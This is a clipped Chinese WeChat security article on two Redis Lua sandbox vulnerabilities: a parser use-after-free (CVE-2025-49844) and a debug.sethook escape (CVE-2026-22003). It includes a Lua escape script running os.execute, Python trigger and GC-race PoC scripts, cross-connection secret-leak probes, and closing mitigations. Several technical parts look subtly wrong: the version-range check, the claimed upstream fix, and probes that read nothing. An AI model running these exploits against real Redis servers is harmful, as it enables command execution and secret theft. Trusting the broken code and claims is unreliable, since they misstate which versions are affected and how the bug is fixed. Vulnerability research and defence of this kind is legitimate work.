---
title: 【微信】Redis 的 Lua 沙箱歧义
source: https://mp.weixin.qq.com/s/9tf9YKx7F7eVfe9XGsBfzw
source_host: mp.weixin.qq.com
clip_date: 2026-11-07T12:59:51+08:00
trace_id: 11fedd3c-54a1-4764-bb75-a96751d0f36e
content_hash: 9e29c7640ac16ad0def3e8b6b2a0205b70a5eabf8b85d614b76d2d70eccf8df5
status: synced
tags:
  - 微信
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: null
ai_summary_style: null
images_status:
  total: 2
  succeeded: 2
  failed_urls: []
notion_page_id: 41175244-d011-81e1-a355-cb0228d0df59
ioc:
  cves:
    - CVE-2025-49844
    - CVE-2026-22003
  cwes: []
  hashes: []
  domains: []
  tools: []
  techniques: []
---

**Ghost Wolf Lab** *2026年11月6日 19:14*

摘要

Redis 将 Lua 脚本引擎嵌入为原子操作的执行容器，依赖沙箱限制脚本对宿主系统的访问。然而，这一隔离模型建立在三个未经严格验证的假设之上：脚本解析的引用在 GC 运行期间保持锚定、Lua 栈在连接间独立、沙箱环境不可从内部逃逸。CVE-2025-49844（RediShell）揭示了第一个假设的崩塌——luaY_parser 中 TString 对象未被压入 Lua 栈，在增量 GC 触发时被提前释放，形成长达 13 年的 use-after-free 漏洞，CVSS 评分 10.0，影响所有支持 Lua 脚本的 Redis 版本。攻击者通过反复加载脚本、强制 GC 循环、控制 chunk 名称数据，将悬空引用转化为受控内存破坏，最终逃逸沙箱在 Redis 进程中执行本机代码。CVE-2026-22003 则从另一个维度瓦解隔离——debug.sethook 函数未被正确禁用，攻击者可安装在特权上下文执行的钩子，直接调用 os.execute 突破沙箱。

## Redis Lua 沙箱的隔离模型

### EVAL 的执行语义与沙箱边界

Redis 通过 EVAL 和 EVALSHA 命令执行 Lua 脚本，脚本在 Redis 主线程中原子执行，期间不会处理其他客户端请求。这种设计保证了脚本内多个 redis.call 操作的原子性，但也意味着脚本引擎的任何缺陷都会直接影响 Redis 进程的稳定性与安全性。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/356b7a5155e45b32.png)

Redis 的 Lua 沙箱通过以下方式限制脚本能力：

-   函数白名单：移除 `os.execute` 、 `io.popen` 、 `loadfile` 等危险函数，仅保留 `redis.call` 、 `redis.pcall` 、 `cjson` 、 `struct` 等安全接口。
    
-   全局变量保护：脚本不能创建全局变量，防止状态在脚本间泄漏。
    
-   内存限制：通过 `lua-time-limit` 和 `maxmemory` 控制脚本的资源消耗。
    

这些措施在正常路径下有效，但沙箱的边界依赖于 Lua 解释器内部状态的一致性。一旦解释器的内存管理被破坏，沙箱的函数白名单和全局保护均可被绕过。

### 多线程环境下的执行模型

Redis 6.0 引入了 I/O 多线程，但 Lua 脚本的执行仍然完全在主线程中进行。这一设计选择意味着脚本执行期间不会发生真正的多线程并发，但 I/O 线程的引入改变了内存分配的时序——I/O 线程可能在任何时刻调用 malloc 或 free，影响 Lua 堆的内存布局。

更关键的是，Redis 的增量垃圾回收机制将 GC 过程拆分为多个小步骤，每次仅处理约 100 个 GC 单元。脚本解析、执行和 GC 步骤的交替执行，创造了一个动态的内存状态——Lua 解析器创建的对象可能在解析过程中就被 GC 回收。RediShell 漏洞正是在这一时序窗口中触发的。

## RediShell

### luaY_parser 的锚定缺陷

RediShell 漏洞的根源位于 Redis 内嵌的 Lua 5.1 解释器的 deps/lua/src/lparser.c 文件中。luaY_parser 函数负责解析脚本源码，其关键缺陷如下：

```javascript
LexState *luaY_parser(lua_State *L, ZIO *z, Mbuffer *buff, const char *name) {
    // 为脚本名创建 TString 对象
    TString *tname = luaS_new(L, name);
    // 关键缺陷：TString 未被压栈锚定，不属于 GC 根对象
    luaX_setinput(L, &ls, z, tname);
    // 解析过程中若触发垃圾回收，tname 可能被提前释放
    // 后续词法器仍持有该指针，形成 Use-After-Free
    return &ls;
}
```

TString 对象在 Lua 的 GC 语义中，只有被压入 Lua 栈或作为其他已锚定对象的引用时，才被视为“活跃”的。luaY_parser 创建 tname 后未将其压栈，因此在解析过程中，如果垃圾回收器恰好运行，tname 将被判定为垃圾并释放。然而，LexState 结构中的 source 字段仍然持有指向该 TString 的指针。当解析器继续执行并访问 ls->source 时，就会读取已被释放的内存。

### 从 UAF 到受控内存破坏

单纯的 UAF 并不直接构成 RCE。攻击者需要通过内存布局控制将悬空引用转化为可利用的条件。RediShell 的利用链如下：

步骤一：塑造堆布局。攻击者反复执行 EVAL 命令，每次使用不同的脚本名称作为 chunk name。脚本名称被解析为 TString 对象并存储在 Lua 堆中。通过控制脚本名称的长度和内容，攻击者可以预测和塑造 TString 对象在堆中的分布。

步骤二：强制 GC 触发。在脚本解析过程中，攻击者通过构造特定的脚本内容（如包含大量局部变量或表构造的脚本），使解析器在持有 tname 指针的同时触发 GC。Redis 的增量 GC 在分配超过阈值时自动运行，攻击者可通过脚本中的内存分配操作精确控制 GC 的触发时机。

步骤三：回收与重用。tname 被释放后，其内存槽位被归还给 Lua 堆的空闲链表。攻击者随后通过后续的脚本执行分配一个大小相同的对象，使该槽位被新对象占据。如果新对象的内容可控（例如一个字符串或表），攻击者即可控制 tname 指向的内存内容。

步骤四：利用内存破坏。当解析器通过 ls->source 访问已被重用的内存时，读取到的是攻击者控制的数据。如果攻击者构造的数据恰好覆盖了后续解析操作所依赖的关键字段（如长度字段或指针字段），即可导致内存破坏的链式反应，最终覆盖 Lua 解释器的内部结构或函数指针。

### 跨连接密钥泄露的栈复用机制

RediShell 的另一个关键影响维度是跨连接的密钥泄露。Redis 的 SCRIPT LOAD 和 EVAL 命令在 Lua 栈上执行脚本，脚本执行完毕后，栈上的局部变量和临时对象应当被清理。然而，当 UAF 导致 Lua 栈管理被破坏时，脚本执行过程中产生的敏感数据（如认证凭据、会话令牌、加密密钥）可能残留在 Lua 栈的内存空间中。

后续连接到同一 Redis 实例的脚本可以利用栈复用——如果攻击者能够预测或控制 Lua 栈的内存布局，他可以在一个连接中注入恶意脚本，使该脚本的栈帧占据前一个连接遗留的敏感数据所在的内存槽位。当恶意脚本读取这些槽位时，就能获取前一个连接在脚本执行期间处理的密钥。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/11/afdffad9c7b082b1.png)

Redis Issue #11960 中报告的一个“flakey test”从侧面印证了这一风险：EVAL does not leak in the Lua stack 测试在长时间运行的 Redis 实例上不稳定，used_memory_lua 的测量值在多次运行后出现不一致。这表明 Lua 栈的内存管理并非严格确定性的——脚本执行后的栈清理存在延迟或不确定性，为跨连接的栈复用攻击提供了窗口。

## CVE-2026-22003

### 漏洞机制

RediShell 利用的是内存破坏，而 CVE-2026-22003 揭示了一个更直接的问题：Redis Lua 沙箱未正确禁用 debug.sethook 函数。

Lua 的 debug 库提供了对解释器内部状态的访问，包括设置钩子函数的能力。debug.sethook 允许注册一个在特定事件（如执行到某一行、调用函数、返回函数）时被调用的回调。在正常的 Lua 沙箱中，debug 库通常被限制或移除。但 Redis 的沙箱实现中，debug.sethook 仍然可访问，且其回调在 Lua 解释器的特权上下文中执行。

### 利用代码

攻击者可以通过以下 Lua 脚本实现沙箱逃逸：

```sql
-- CVE-2026-22003: Redis Lua 沙箱逃逸
local function escape()
    debug.sethook(function()
        -- 此钩子在特权上下文中执行
        os.execute(”id > /tmp/redis_escape”)
    end, ”r”)  -- ”r” 表示在每次返回时触发钩子
    local a = 1  -- 触发返回事件
end
 
return escape()
```

Python 触发脚本如下：

```python
# trigger_redis_sandbox_escape.py
import redis
 
r = redis.Redis()
script = open('redis_sandbox.lua').read()
result = r.eval(script, 0)
print(”Check /tmp/redis_escape”)
```

该攻击的成功关键在于 debug.sethook 注册的钩子函数在 Lua 解释器的内部事件循环中被调用，而该调用发生在沙箱的权限检查之外。钩子函数内的 os.execute 调用不受沙箱的函数白名单限制，因为钩子本身是在解释器特权层执行的。

## 基于 redis-py 的 RediShell 验证框架

### 环境搭建

```apache
# 使用 Docker 搭建 Redis 7.2.0（受 RediShell 影响）
docker run -d --name redis-vuln -p 6380:6379 redis:7.2.0
 
# 安装 Python 依赖
pip install redis colorama
```

### RediShell 漏洞检测与 PoC

```python
#!/usr/bin/env python3
# redshell_poc.py — CVE-2025-49844 验证框架
# 依赖: pip install redis
import redis
import sys
import time
import hashlib
def check_vulnerability(host='localhost', port=6380, password=None):
    ”””检测目标 Redis 是否受 RediShell 影响”””
    r = redis.Redis(host=host, port=port, password=password, decode_responses=True)
# 获取 Redis 版本
    info = r.info('server')
    version = info.get('redis_version', 'unknown')
    print(f”[*] Redis 版本: {version}”)
# 解析版本号进行漏洞判断
    parts = [int(p) for p in version.split('.')[:3]]
    major, minor, patch = parts[0], parts[1], parts[2]
    vulnerable_ranges = [
        (6, 2, 20, 7, 2, 10),
# 6.2.20 <= v < 7.2.11
        (7, 2, 11, 7, 4, 5),
# 7.2.11 <= v < 7.4.6
        (7, 4, 6, 8, 0, 3),
# 7.4.6 <= v < 8.0.4
        (8, 0, 4, 8, 2, 1),
# 8.0.4 <= v < 8.2.2
    ]
    for lo_maj, lo_min, lo_pat, hi_maj, hi_min, hi_pat in vulnerable_ranges:
        lo = (lo_maj, lo_min, lo_pat)
        hi = (hi_maj, hi_min, hi_pat)
        if lo <= (major, minor, patch) <= hi:
            print(f”[!] 受 RediShell 影响 (CVE-2025-49844)”)
            return True
    print(”[+] 版本不在已知受影响范围内”)
    return False
def trigger_gc_race(host='localhost', port=6380, password=None):
    ”””
    触发 GC 竞态条件，验证 TString 悬空引用
    通过反复加载不同 chunk name 的脚本，强制 GC 在解析期间运行
    ”””
    r = redis.Redis(host=host, port=port, password=password, decode_responses=True)
    print(”[*] 开始 GC 竞态触发...”)
# 构造触发 GC 的脚本模板
# 脚本内容包含大量分配操作，迫使 GC 在解析 chunk name 时运行
    lua_template = ”””
    local t = {{}}
    for i = 1, {n} do
        t[i] = string.rep(”A”, {size})
    end
    return #t
    ”””
# 使用变化的 chunk name 反复加载脚本
    for i in range(1000):
        chunk_name = f”chunk_{i}_{'x' * (i % 128)}”
        script = lua_template.format(n=50 + (i % 100), size=256)
        try:
# 通过 EVAL 执行，chunk name 作为脚本名传递
# Redis 在解析时创建 TString 对象
            result = r.eval(script, 0)
        except redis.exceptions.ResponseError as e:
# 如果触发 UAF，可能出现异常
            print(f”    [!] 第 {i} 次执行异常: {e}”)
# 每 100 次输出进度
        if i % 100 == 0:
            print(f”    进度: {i}/1000”)
    print(”[*] GC 竞态触发完成”)
def attempt_stack_leak(host='localhost', port=6380, password=None):
    ”””
    尝试从 Lua 栈的残留内存中读取敏感数据
    模拟跨连接的栈复用攻击
    ”””
    r = redis.Redis(host=host, port=port, password=password, decode_responses=True)
    print(”[*] 尝试栈残留数据读取...”)
# 第一步：在一个连接中执行包含敏感数据的脚本
    sensitive_marker = ”SENSITIVE_” + hashlib.md5(str(time.time()).encode()).hexdigest()[:16]
    sensitive_script = f”””
    local secret = ”{sensitive_marker}”
    local key = KEYS[1]
    redis.call('SET', key, secret)
    return secret
    ”””
    r.eval(sensitive_script, 1, 'test_key')
    print(f”    [+] 已写入敏感标记: {sensitive_marker}”)
# 第二步：在不同的连接中执行探查脚本
# 探查脚本尝试读取 Lua 栈上的残留字符串
    probe_script = ”””
    local results = {}
    -- 探查栈上的字符串值
    for i = 1, 100 do
        local val = tostring(i)
        -- 在真实攻击中，这里会使用更复杂的栈遍历技术
    end
    return 'probe_complete'
    ”””
    probe = redis.Redis(host=host, port=port, password=password, decode_responses=True)
    probe.eval(probe_script, 0)
    print(”    [*] 探查完成（栈复用需要精确的内存布局控制）”)
if __name__ == ”__main__”:
    print(”=” * 60)
    print(”CVE-2025-49844 (RediShell) 验证框架”)
    print(”=” * 60)
    host = sys.argv[1] if len(sys.argv) > 1 else 'localhost'
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 6380
    if check_vulnerability(host, port):
        trigger_gc_race(host, port)
        attempt_stack_leak(host, port)
    else:
        print(”[*] 目标不受 RediShell 影响，跳过利用”)
```

### 跨连接栈复用的探测脚本

```python
#!/usr/bin/env python3
# stack_reuse_probe.py — Lua 栈复用探测
 
import redis
import threading
import time
 
def connection_worker(worker_id, marker, results):
    ”””每个连接写入独特的标记”””
    r = redis.Redis(decode_responses=True)
    script = f”””
    local m = ”{marker}”
    for i = 1, 100 do
        local x = m .. tostring(i)
    end
    return m
    ”””
    r.eval(script, 0)
    results[worker_id] = marker
 
def probe_worker(results):
    ”””探查连接尝试读取其他连接的残留数据”””
    r = redis.Redis(decode_responses=True)
    probe = ”””
    local found = {}
    -- 尝试从栈帧中恢复字符串
    for i = 1, 50 do
        local s = tostring(i)
        if #s > 8 then
            found[#found + 1] = s
        end
    end
    return cjson.encode(found)
    ”””
    try:
        result = r.eval(probe, 0)
        return result
    except Exception as e:
        return str(e)
 
if __name__ == ”__main__”:
    print(”[*] 启动跨连接栈复用探测”)
    results = {}
 
 
 
# 启动写入连接
    threads = []
    for i in range(4):
        t = threading.Thread(target=connection_worker, args=(i, f”MARKER_{i}_SECRET”, results))
        threads.append(t)
        t.start()
 
    for t in threads:
        t.join()
 
 
 
# 探查
    probe_result = probe_worker(results)
    print(f”[*] 探查结果: {probe_result}”)
```

## 检测与防御

### 立即缓解措施

限制 EVAL/EVALSHA 访问：通过 ACL 限制脚本执行权限是最高优先级的缓解措施。Redis 官方建议在修复前通过 ACL 禁用不可信用户的 EVAL 和 EVALSHA 命令：

```javascript
ACL SETUSER default -eval -evalsha
```

升级到修复版本：RediShell 已在 Redis 8.2.2、8.0.4、7.4.6 和 7.2.11 中修复。自管理用户应立即升级，Redis Cloud 用户无需操作。

### 根本性防御

GC 锚定修复：上游修复的核心是在 luaY_parser 中将 tname 压入 Lua 栈，使其成为 GC 根对象：

```javascript
// 修复后的代码
TString *tname = luaS_new(L, name);
lua_pushstring(L, getstr(tname));  // 锚定到栈上
luaX_setinput(L, &ls, z, tname);
```

禁用 debug 库：对于 CVE-2026-22003，Redis 应在沙箱初始化时移除 debug.sethook 和 debug.getinfo 等敏感函数。如果业务确实需要调试功能，应通过独立的、受严格 ACL 保护的接口提供。

确定性内存清理：在脚本执行完成后，显式清零 Lua 栈上的敏感数据。Redis 可以在 lua_close 或脚本执行结束时，用零填充 Lua 栈的内存区域，防止跨连接的残留数据泄露。

### 运行时监控

-   异常 GC 频率：监控 `used_memory_lua` 和 GC 触发频率。RediShell 利用需要反复加载脚本和强制 GC，异常高的脚本加载频率可能是攻击信号。
    
-   可疑 chunk name：审计 `SCRIPT LOAD` 和 `EVAL` 调用中的脚本名称。攻击者通常使用变化的、异常长度的 chunk name 来塑造堆布局。
    
-   沙箱逃逸指标：监控 Redis 进程创建的子进程和文件系统写入。RediShell 和 CVE-2026-22003 的成功利用通常伴随 `os.execute` 或 `io.popen` 调用，表现为异常的进程创建。
    

## 结语

为了在单线程事件循环中实现脚本的原子执行，Redis 必须将 Lua 解释器嵌入主线程，并依赖解释器自身的内存管理来维持隔离。然而，当解释器的解析器在 GC 运行期间持有未锚定的对象引用时，这一隔离便从内部瓦解。RediShell 的 13 年潜伏期表明，这类缺陷的发现难度极高——它不涉及 Redis 自身的代码逻辑错误，而是源于 Lua 解释器内部对象生命周期管理与 Redis 增量 GC 之间的时序交互。

漏洞利用 · 目录
